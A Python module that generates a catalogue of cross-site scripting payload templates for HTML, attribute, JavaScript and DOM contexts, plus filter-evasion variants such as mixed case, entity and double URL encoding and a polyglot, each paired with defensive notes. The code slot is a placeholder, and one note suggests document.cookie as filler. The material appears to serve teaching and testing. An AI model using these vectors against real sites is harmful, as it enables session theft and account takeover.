"""
XSS Payload Module - Non-Executing Educational Template Generator

Reference: PortSwigger XSS Cheat Sheet
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

TEMPLATE NOTATION:
  [PAYLOAD]      - substitute with your test function, e.g. console.log(1)
  [URL]          - substitute with a target/callback URL
  [EVENT]        - substitute with any valid HTML event handler name
  [TAG]          - substitute with an injectable HTML tag name
  [STRING_BREAK] - substitute with quote char matching the injection context

All payloads are NON-EXECUTING TEMPLATES. They demonstrate structure and
injection concept only. No JavaScript will run from these strings as-is.
"""

_P = '[PAYLOAD]'   # Non-executing placeholder — not live JS


class XSSPayloadGenerator:
    """Generate non-executing educational XSS payload templates"""

    def __init__(self):
        self.payloads = []

    def generate_all_contexts(self):
        payloads = []
        payloads.extend(self._generate_html_context())
        payloads.extend(self._generate_attribute_context())
        payloads.extend(self._generate_javascript_context())
        payloads.extend(self._generate_dom_based())
        payloads.extend(self._generate_bypass_examples())
        return payloads

    # ------------------------------------------------------------------ #
    #  HTML CONTEXT                                                         #
    # ------------------------------------------------------------------ #
    def _generate_html_context(self):
        return [
            {
                'type': 'XSS',
                'subtype': 'Reflected',
                'context': 'HTML Context',
                'template_note': 'Replace [PAYLOAD] with target JS expression, e.g. document.cookie',
                'payload': '<script>[PAYLOAD]</script>',
                'description': (
                    'TEMPLATE — Basic script tag injection in HTML body. '
                    'Demonstrates the most direct XSS vector when user input '
                    'is reflected into page HTML without any encoding.'
                ),
                'bypass_explanation': 'Direct <script> tag — blocked by most WAFs and CSP default-src policies.',
                'defensive_notes': 'Enforce Content-Security-Policy with no unsafe-inline. HTML-encode all user output: & < > " apostrophe -> entities.',
            },
            {
                'type': 'XSS',
                'subtype': 'Reflected',
                'context': 'HTML Context',
                'template_note': 'Replace [PAYLOAD] with JS expression. onerror fires when src fails to load.',
                'payload': '<img src=x onerror=[PAYLOAD]>',
                'description': (
                    'TEMPLATE — Event-handler injection via broken image tag. '
                    'Shows how onerror fires when browser cannot load src="x". '
                    'Avoids <script> tag entirely.'
                ),
                'bypass_explanation': 'Avoids <script> entirely; uses an HTML event attribute. Naive filters that only block the word "script" are bypassed.',
                'defensive_notes': 'Sanitise all HTML event attributes (on*). DOMPurify strips event handlers by default.',
            },
            {
                'type': 'XSS',
                'subtype': 'Stored',
                'context': 'HTML Context',
                'template_note': 'Replace [PAYLOAD]. onload fires as soon as SVG element renders.',
                'payload': '<svg onload=[PAYLOAD]>',
                'description': (
                    'TEMPLATE — SVG element with onload event. '
                    'Stored XSS scenario: payload persists in DB and '
                    'executes for every user who loads the page.'
                ),
                'bypass_explanation': 'SVG is a valid HTML5 element. Filters that only check <script> miss SVG event handlers.',
                'defensive_notes': 'Treat SVG as active content — sanitise or reject. Use DOMPurify or server-side HTML sanitisation.',
            },
            {
                'type': 'XSS',
                'subtype': 'Reflected',
                'context': 'HTML Context',
                'template_note': 'Replace [PAYLOAD] with JS expression after javascript: scheme.',
                'payload': '<iframe src="javascript:[PAYLOAD]">',
                'description': (
                    'TEMPLATE — javascript: URI scheme inside iframe src. '
                    'Shows how non-HTTP protocol schemes can carry executable code '
                    'when placed in navigable URL attributes.'
                ),
                'bypass_explanation': 'Browsers treat javascript: as a navigable URI. URL-only validation that allows any scheme is insufficient.',
                'defensive_notes': 'Whitelist allowed URL schemes (http/https only). Set frame-src CSP directive to restrict iframe sources.',
            },
            {
                'type': 'XSS',
                'subtype': 'Reflected',
                'context': 'HTML Context',
                'template_note': 'Replace [PAYLOAD]. onload fires after full page load.',
                'payload': '<body onload=[PAYLOAD]>',
                'description': (
                    'TEMPLATE — Body tag with onload event. '
                    'Relevant when injection point is near the top of the DOM '
                    'or when the app reflects input into body-level attributes.'
                ),
                'bypass_explanation': 'Body tag event handlers are less commonly filtered. Requires injection point outside existing body tag.',
                'defensive_notes': 'Encode all output in HTML attribute positions. Never reflect user input into tag or attribute names.',
            },
            {
                'type': 'XSS',
                'subtype': 'Reflected',
                'context': 'HTML Context',
                'template_note': 'Replace [PAYLOAD]. ontoggle fires when <details> opens or closes. open auto-triggers it on load.',
                'payload': '<details open ontoggle=[PAYLOAD]>',
                'description': (
                    'TEMPLATE — HTML5 <details> element with ontoggle event. '
                    'Demonstrates how newer HTML5 elements provide additional '
                    'event-handler attack surface absent from older filter lists.'
                ),
                'bypass_explanation': 'The open attribute auto-triggers ontoggle on page load — no user interaction required.',
                'defensive_notes': 'Maintain an up-to-date allowlist of permitted HTML elements and block all on* event attributes.',
            },
        ]

    # ------------------------------------------------------------------ #
    #  ATTRIBUTE CONTEXT                                                    #
    # ------------------------------------------------------------------ #
    def _generate_attribute_context(self):
        return [
            {
                'type': 'XSS',
                'subtype': 'Reflected',
                'context': 'Attribute Context — double-quote breakout',
                'template_note': 'Injection inside value="[INPUT]". Leading " closes attribute; injects handler; trailing x=" reopens a dummy one.',
                'payload': '" onmouseover="[PAYLOAD]" x="',
                'description': (
                    'TEMPLATE — Double-quote breakout into an event handler. '
                    'Shows how unencoded " in an attribute value lets an attacker '
                    'append arbitrary HTML attributes including event handlers.'
                ),
                'bypass_explanation': 'Breaks out of the attribute with ". Injects a new event handler, then closes cleanly with a dangling attribute.',
                'defensive_notes': 'HTML-encode all attribute output. At minimum: " -> &quot; and apostrophe -> &#x27;.',
            },
            {
                'type': 'XSS',
                'subtype': 'Reflected',
                'context': "Attribute Context — single-quote breakout",
                'template_note': "Injection inside value='[INPUT]'. autofocus triggers onfocus without user interaction.",
                'payload': "' autofocus onfocus=[PAYLOAD] x='",
                'description': (
                    'TEMPLATE — Single-quote breakout with autofocus trick. '
                    'Demonstrates bypassing applications that escape " but not apostrophe.'
                ),
                'bypass_explanation': 'Applications often escape double quotes but forget single quotes. autofocus causes onfocus to fire automatically on page load.',
                'defensive_notes': 'Encode BOTH quote characters in attribute output. Prefer double-quoted attributes with HTML entity encoding.',
            },
            {
                'type': 'XSS',
                'subtype': 'Reflected',
                'context': 'Attribute Context — href / action (javascript: URI)',
                'template_note': 'Template goes directly into href="[INPUT]" or action="[INPUT]". Replace [PAYLOAD] with JS expression.',
                'payload': 'javascript:[PAYLOAD]',
                'description': (
                    'TEMPLATE — javascript: URI injected into a URL attribute. '
                    'Demonstrates that href and action attributes accept pseudo-schemes '
                    'that the browser interprets as executable code when followed.'
                ),
                'bypass_explanation': 'URL-encoding the colon (javascript%3A) can bypass naive string-match filters. Browser decodes before navigating.',
                'defensive_notes': 'Validate URL attributes against allowlist of safe schemes (http, https, mailto). Reject everything else.',
            },
            {
                'type': 'XSS',
                'subtype': 'Reflected',
                'context': 'Attribute Context — src (data: URI)',
                'template_note': 'Entire string placed in src="[INPUT]". Replace [PAYLOAD] in the embedded script body.',
                'payload': 'data:text/html,<script>[PAYLOAD]</script>',
                'description': (
                    'TEMPLATE — data: URI carrying an inline HTML document with script. '
                    'Shows how data URIs bypass domain-based URL validation '
                    'because the content is self-contained.'
                ),
                'bypass_explanation': 'data: URIs load self-contained content. The embedded page runs in a null origin. CSP must explicitly block data:.',
                'defensive_notes': 'Set CSP default-src to block data: URIs. Validate src values start with http:// or https:// only.',
            },
            {
                'type': 'XSS',
                'subtype': 'Reflected',
                'context': 'Attribute Context — unquoted attribute value',
                'template_note': 'Injection in unquoted attribute: value=[INPUT]. Space alone breaks out of the value.',
                'payload': 'x onmouseover=[PAYLOAD]',
                'description': (
                    'TEMPLATE — Injection into an unquoted HTML attribute. '
                    'Shows that omitting attribute quotes significantly widens '
                    'the attack surface: any whitespace terminates the value.'
                ),
                'bypass_explanation': 'Unquoted attributes end at the first whitespace. No quote-escaping is needed — a space achieves breakout.',
                'defensive_notes': 'Always quote HTML attributes. Even then, output inside must be HTML-encoded.',
            },
        ]

    # ------------------------------------------------------------------ #
    #  JAVASCRIPT CONTEXT                                                   #
    # ------------------------------------------------------------------ #
    def _generate_javascript_context(self):
        return [
            {
                'type': 'XSS',
                'subtype': 'Reflected',
                'context': 'JavaScript Context — string literal (single-quote)',
                'template_note': "Injection in: var x = '[INPUT]'; Leading ' closes string; trailing ' reopens it to avoid syntax error.",
                'payload': "'-[PAYLOAD]-'",
                'description': (
                    'TEMPLATE — Single-quote string breakout inside a JS block. '
                    'Demonstrates how reflecting user data into a JS string literal '
                    'without JS-encoding allows escaping the string context.'
                ),
                'bypass_explanation': "Closes the open string, runs the expression, reopens a string to prevent JS parse error.",
                'defensive_notes': 'Use JSON.stringify() or JS-context encoder when writing server data into script blocks. Never concatenate raw input.',
            },
            {
                'type': 'XSS',
                'subtype': 'Reflected',
                'context': 'JavaScript Context — script tag closure',
                'template_note': 'The first </script> closes the server-rendered block. Replace [PAYLOAD] in the injected second tag.',
                'payload': '</script><script>[PAYLOAD]</script>',
                'description': (
                    'TEMPLATE — Premature script-block closure followed by a fresh block. '
                    'Shows that </script> inside a JS string is parsed as HTML '
                    'by the browser tokeniser before JS is evaluated.'
                ),
                'bypass_explanation': 'HTML tokenisation happens before JS parsing. The browser closes the script block at </script> even inside a quoted string.',
                'defensive_notes': r'Escape </script> as <\/script> inside JS strings. Use json_encode / JSON.stringify for data embedding.',
            },
            {
                'type': 'XSS',
                'subtype': 'Reflected',
                'context': 'JavaScript Context — double-quote breakout + line comment',
                'template_note': 'Injection in: var x = "[INPUT]"; doSomething(); — semicolon ends statement, // silences the rest of the line.',
                'payload': '"; [PAYLOAD] //',
                'description': (
                    'TEMPLATE — Double-quote breakout with trailing JS line comment. '
                    'Terminates the current JS statement and silences any '
                    'trailing server-generated code that would cause a parse error.'
                ),
                'bypass_explanation': 'Double-quote closes string. Semicolon ends statement. // suppresses remaining original code on that line.',
                'defensive_notes': 'Encode all of: " apostrophe \\ ; / when outputting into JS context. Prefer data attributes + DOM reads over inline data.',
            },
            {
                'type': 'XSS',
                'subtype': 'Reflected',
                'context': 'JavaScript Context — ES6 template literal breakout',
                'template_note': 'Injection inside: `Hello [INPUT]` — backtick closes the literal; ${...} is template interpolation.',
                'payload': '`-${[PAYLOAD]}-`',
                'description': (
                    'TEMPLATE — Breakout from an ES6 template literal. '
                    'Demonstrates that template literals use backtick as their '
                    'delimiter, distinct from single and double quotes.'
                ),
                'bypass_explanation': 'Encoders that only handle apostrophe and " miss the backtick. ${...} inside a template literal is evaluated as JS.',
                'defensive_notes': 'Encode backticks and ${ sequences when reflecting into template literal context. Transfer data via JSON in a data attribute instead.',
            },
        ]

    # ------------------------------------------------------------------ #
    #  DOM-BASED XSS                                                        #
    # ------------------------------------------------------------------ #
    def _generate_dom_based(self):
        return [
            {
                'type': 'XSS',
                'subtype': 'DOM-based',
                'context': 'DOM Sink — innerHTML via location.hash',
                'template_note': 'Vulnerable JS: elem.innerHTML = location.hash.slice(1). This template goes in the URL fragment after #.',
                'payload': '#<img src=x onerror=[PAYLOAD]>',
                'description': (
                    'TEMPLATE — innerHTML sink reading from URL fragment. '
                    'The server never sees the # portion; the browser processes '
                    'it entirely client-side. Server WAFs cannot protect against this.'
                ),
                'bypass_explanation': 'Fragment identifiers are never sent to the server. innerHTML parses the string as HTML, triggering event handlers.',
                'defensive_notes': 'Use textContent instead of innerHTML for user-controlled data. If HTML is required, run DOMPurify before assignment.',
            },
            {
                'type': 'XSS',
                'subtype': 'DOM-based',
                'context': 'DOM Sink — document.write via query param',
                'template_note': 'Vulnerable JS: document.write(location.search). Template goes in the URL query string.',
                'payload': '?q=<script>[PAYLOAD]</script>',
                'description': (
                    'TEMPLATE — document.write sink via URL query parameter. '
                    'One of the most dangerous DOM sinks: writes raw HTML '
                    'directly into the live page.'
                ),
                'bypass_explanation': 'document.write outputs literal HTML. Any HTML/JS in the string is parsed and executed immediately.',
                'defensive_notes': 'Avoid document.write entirely — use DOM APIs. If unavoidable, HTML-encode all dynamic values before writing.',
            },
            {
                'type': 'XSS',
                'subtype': 'DOM-based',
                'context': 'DOM Sink — eval / setTimeout(string)',
                'template_note': 'Vulnerable JS: eval(userInput) or setTimeout(userInput, 100). Template IS the JS expression — no HTML tags needed.',
                'payload': '[PAYLOAD]',
                'description': (
                    'TEMPLATE — eval-family sink receiving user-controlled input. '
                    'No HTML parsing occurs — raw JS is evaluated directly. '
                    'No < or > characters are needed to exploit this vector.'
                ),
                'bypass_explanation': 'eval() is the most direct code-execution sink. Server-side HTML filtering is completely irrelevant here.',
                'defensive_notes': 'Never pass user-controlled data to eval(), Function(), setTimeout(string), or setInterval(string). Use function references.',
            },
            {
                'type': 'XSS',
                'subtype': 'DOM-based',
                'context': 'DOM Sink — location.href assignment',
                'template_note': 'Vulnerable JS: location.href = userInput. Template is the full URI value assigned to the property.',
                'payload': 'javascript:[PAYLOAD]',
                'description': (
                    'TEMPLATE — Unsafe URL assignment to location.href. '
                    'If user input is assigned to location.href without validation, '
                    'a javascript: URI executes when the browser navigates.'
                ),
                'bypass_explanation': 'The browser "navigates" to javascript: URIs by executing the expression. No page load occurs.',
                'defensive_notes': 'Validate URLs start with http:// or https:// before assigning to location. Use new URL(input) to inspect the scheme.',
            },
        ]

    # ------------------------------------------------------------------ #
    #  BYPASS / FILTER EVASION TECHNIQUES                                  #
    # ------------------------------------------------------------------ #
    def _generate_bypass_examples(self):
        return [
            {
                'type': 'XSS',
                'subtype': 'Bypass — Case Manipulation',
                'context': 'Filter Evasion',
                'template_note': 'Replace [PAYLOAD]. Mixed case fools case-sensitive string matchers while remaining valid HTML.',
                'payload': '<ScRiPt>[PAYLOAD]</sCrIpT>',
                'description': (
                    'TEMPLATE — Mixed-case tag name to bypass case-sensitive filters. '
                    'HTML tag names are ASCII case-insensitive so the browser '
                    'executes the block even without a literal "script" match.'
                ),
                'bypass_explanation': 'A filter checking for "<script>" misses "<ScRiPt>". HTML spec: tag names are case-insensitive.',
                'defensive_notes': 'Normalise to lowercase before pattern-matching. Better: use an allowlist HTML parser, not string matching.',
            },
            {
                'type': 'XSS',
                'subtype': 'Bypass — HTML Entity Encoding',
                'context': 'Filter Evasion',
                'template_note': 'Browser decodes entities before executing event handler. &#91; = [ and &#93; = ] as decimal entities.',
                'payload': '<img src=x onerror=&#91;[PAYLOAD]&#93;>',
                'description': (
                    'TEMPLATE — HTML decimal entity encoding inside an event handler. '
                    'Demonstrates that browsers decode character references before '
                    'executing event-handler code, allowing keyword filters to be bypassed.'
                ),
                'bypass_explanation': 'Filters scan for raw JS keywords but miss entity-encoded equivalents. Browser decodes the attribute before passing to JS engine.',
                'defensive_notes': 'Decode all HTML entities BEFORE applying security filters. Validate the decoded content.',
            },
            {
                'type': 'XSS',
                'subtype': 'Bypass — Tag Switching',
                'context': 'Filter Evasion',
                'template_note': 'Replace [PAYLOAD]. autofocus triggers onfocus automatically — no user click required.',
                'payload': '<input autofocus onfocus=[PAYLOAD]>',
                'description': (
                    'TEMPLATE — Alternate interactive element with autofocus. '
                    'Demonstrates that blocking <script> and <img> is insufficient: '
                    'many other tags support event handlers.'
                ),
                'bypass_explanation': 'Filters blocking only <script>/<img> miss <input>, <select>, <textarea>, <video>, <audio>, <details> and more.',
                'defensive_notes': 'Block ALL on* event attributes regardless of tag. Use a comprehensive sanitisation allowlist, not a denylist.',
            },
            {
                'type': 'XSS',
                'subtype': 'Bypass — Whitespace / Delimiter Abuse',
                'context': 'Filter Evasion',
                'template_note': 'Replace [PAYLOAD]. Forward slash acts as whitespace inside tag syntax per the HTML spec.',
                'payload': '<img/src=x/onerror=[PAYLOAD]>',
                'description': (
                    'TEMPLATE — Forward slashes used instead of spaces inside a tag. '
                    'Demonstrates that HTML attribute separators are not limited '
                    'to ASCII space.'
                ),
                'bypass_explanation': 'Per the HTML spec, / inside a tag (outside quoted values) is treated as whitespace. Filters expecting spaces miss this.',
                'defensive_notes': 'Parse HTML with a compliant parser, not regex. Regex-based HTML filters are fundamentally unreliable.',
            },
            {
                'type': 'XSS',
                'subtype': 'Bypass — Double URL Encoding',
                'context': 'Filter Evasion',
                'template_note': '%253C = double-encoded < (%25 encodes %, then %3C encodes <). If decoded twice, < is restored.',
                'payload': '%253Cscript%253E[PAYLOAD]%253C%252Fscript%253E',
                'description': (
                'TEMPLATE — Double URL-encoded script tag. '
                'Demonstrates that applications decoding user input more '
                'than once expose themselves to encoding-layer bypass.'
                ),
                'bypass_explanation': 'First decode: %253C -> %3C (filter sees harmless %3C). Second decode: %3C -> < (browser sees raw HTML).',
                'defensive_notes': 'Decode exactly once before validation. Apply security checks only on fully decoded data.',
            },
            {
                'type': 'XSS',
                'subtype': 'Bypass — Polyglot Template',
                'context': 'Filter Evasion — Multi-Context',
                'template_note': 'Replace [PAYLOAD]. Structured to break out of 6 common injection contexts simultaneously.',
                'payload': 'javascript:/*--></title></style></textarea></script><svg/onload="[PAYLOAD]">',
                'description': (
                    'TEMPLATE — Multi-context polyglot payload structure. '
                    'Designed to succeed regardless of which HTML/JS context '
                    'the injection lands in by closing all common wrappers first.'
                ),
                'bypass_explanation': 'Closes </title>, </style>, </textarea>, </script> to escape those contexts. Falls through to SVG onload as the final vector.',
                'defensive_notes': 'No single encoding handles all contexts. Apply context-specific encoding at every injection point. Use a validated allowlist HTML parser.',
            },
        ]

    def generate_custom(self, context, bypass_type):
        """Extend here for custom template generation"""
        pass